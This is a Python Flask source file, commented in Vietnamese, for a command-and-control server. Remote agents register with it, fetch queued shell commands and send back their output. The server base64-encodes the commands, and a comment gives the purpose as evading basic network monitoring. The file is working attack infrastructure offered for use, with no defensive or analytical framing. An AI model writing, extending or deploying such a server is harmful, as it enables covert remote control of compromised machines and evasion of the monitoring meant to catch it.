from flask import Flask, request
import random
import string
import datetime
import threading
import time
import sys
import base64  

# Tắt log mặc định của Flask
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)

# Cấu trúc: {'ID': {'name': '...', 'tasks': ['lenh1', 'lenh2'], 'results': []}}
agents = {}

def generate_id():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))

# --- Hàm hỗ trợ giải mã an toàn ---
def safe_decode(data_str):
    try:
        return base64.b64decode(data_str).decode('utf-8', errors='ignore')
    except Exception:
        return f"[Raw Data] {data_str}"

# --- API ENDPOINTS ---

@app.route('/reg', methods=['POST'])
def register():
    agent_name = request.form.get('name')
    new_id = generate_id()
    agents[new_id] = {
        "name": agent_name,
        "tasks": [],     # Hàng đợi lệnh
        "results": []
    }
    print(f"\n[+] New Agent: {agent_name} -> ID: {new_id}")
    return new_id, 200

@app.route('/tasks/<agent_id>', methods=['GET'])
def get_task(agent_id):
    # Nếu agent tồn tại và có lệnh đang chờ
    if agent_id in agents and agents[agent_id]['tasks']:
        # Lấy lệnh đầu tiên ra (First In First Out)
        task = agents[agent_id]['tasks'].pop(0)
        return task, 200
    return '', 204 

@app.route('/results/<agent_id>', methods=['POST'])
def receive_result(agent_id):
    if agent_id in agents:
        encoded_output = request.form.get('result')
        if encoded_output:
            # --- decode kết quả từ Agent trước khi in ---
            decoded_output = safe_decode(encoded_output)
            print(f"\n[v] Result from {agents[agent_id]['name']} ({agent_id}):\n{decoded_output}")
            print("C2 > ", end="", flush=True)
    return '', 200

# --- CLI ---

def console_thread():
    time.sleep(2) 
    print("\n=== C2 COMMAND CENTER ===")
    print("Syntax: set <agent_id> <command>")
    print("Example: set A1B2C3 whoami")
    
    while True:
        try:
            cmd = input("\nC2 > ")
            if not cmd: continue
            
            parts = cmd.split(' ', 2)
            if parts[0] == "set" and len(parts) == 3:
                target_id = parts[1]
                plain_task = parts[2] # Lệnh dạng clear text
                
                if target_id in agents:
                    # --- Mã hóa lệnh trước khi đẩy vào hàng đợi ---
                    # Mã hóa để bypass các thiết bị giám sát mạng cơ bản
                    encoded_task = base64.b64encode(plain_task.encode()).decode()
                    
                    agents[target_id]['tasks'].append(encoded_task)
                    print(f"[*] Queued encoded task for Agent {target_id}")
                else:
                    print(f"[-] Agent ID {target_id} not found!")
            elif cmd == "list":
                print(f"Agents: {list(agents.keys())}")
            else:
                print("Unknown command. Use: set <id> <cmd> | list")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    t = threading.Thread(target=console_thread, daemon=True)
    t.start()
    
    app.run(host='0.0.0.0', port=8080)